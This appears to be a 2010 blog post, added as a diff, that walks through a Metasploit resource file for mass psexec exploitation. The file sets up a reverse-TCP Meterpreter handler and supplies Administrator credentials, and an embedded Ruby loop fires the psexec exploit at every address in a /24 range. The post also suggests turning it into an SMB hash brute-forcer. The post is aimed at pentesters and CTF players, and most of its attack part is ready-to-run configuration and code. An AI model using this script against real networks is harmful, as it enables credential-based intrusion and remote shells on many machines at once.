@@ -1,0 +1,81 @@
+---
+author: mubix
+comments: true
+date: 2010-09-12 15:06:39+00:00
+layout: post
+title: Rapid fire PSEXEC for Metasploit
+categories:
+- metasploit
+- meterpreter
+- resource files
+- script
+---
+
+Exploit modules inside of metasploit don't have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It's really not much but there are some really juicy pieces of knowledge I learned on the way here.
+
+// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I've broken it up into sections. Also take note of the "setg" which sets the variable globally so that I don't have to set it inside of the psexec module.
+
+```
+use multi/handler  
+setg PAYLOAD windows/meterpreter/reverse_tcp  
+setg LHOST 192.168.1.114  
+setg LPORT 80  
+set ExitOnSession false
+
+exploit -j -z
+```
+
+This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn't have to set up and tear down the handler. = fast. The following though is just the setup for the module.
+
+```
+use windows/smb/psexec  
+set SMBUser Administrator  
+set SMBPass password123
+```
+
+Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren't joined to a domain they can take pretty much anything here.
+
+However if they are actually joined to a domain, you either have to have the computer name (which definitely won't play well with a scanner easily) or use domain credentials.
+
+```
+set SMBDomain .
+```
+
+The "." is something every Windows API programmer would know as it's really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won't take either localhost or 127.0.0.1.
+
+Next up, we don't want each run of the exploit module to build the multi/handler and tear it down every single run. That's why we built it first and set DisablePayloadHandler inside of the psexec module.
+
+```
+set DisablePayloadHandler true
+```
+
+Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the `<ruby>` html like block identifier you can then use the power of Ruby combined with Rex (Metasploit's API) to do really cool stuff.
+
+More setup, but this time for the ruby portion. Using Metasploit's RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the "file:" prefix.
+
+```ruby
+<ruby>  
+require 'rex/socket/range_walker'  
+rhosts = "192.168.92.0/24"  
+iplist = Rex::Socket::RangeWalker.new(rhosts)  
+iplist.each do |rhost|
+```
+
+So, we've included RangeWalker, parsed it, and loaded it into an 'each' for loop.
+
+The `self.run_single` function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?
+
+```ruby
+	self.run_single("set RHOST #{rhost}")  
+	self.run_single("exploit -j -z")
+end  
+</ruby>
+```
+
+That's it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the "-z -j" just as we did with multi/handler.
+
+Now, if your credentials worked on any of the IPs you'll have sessions waiting for you.
+
+This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.
+
+Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.
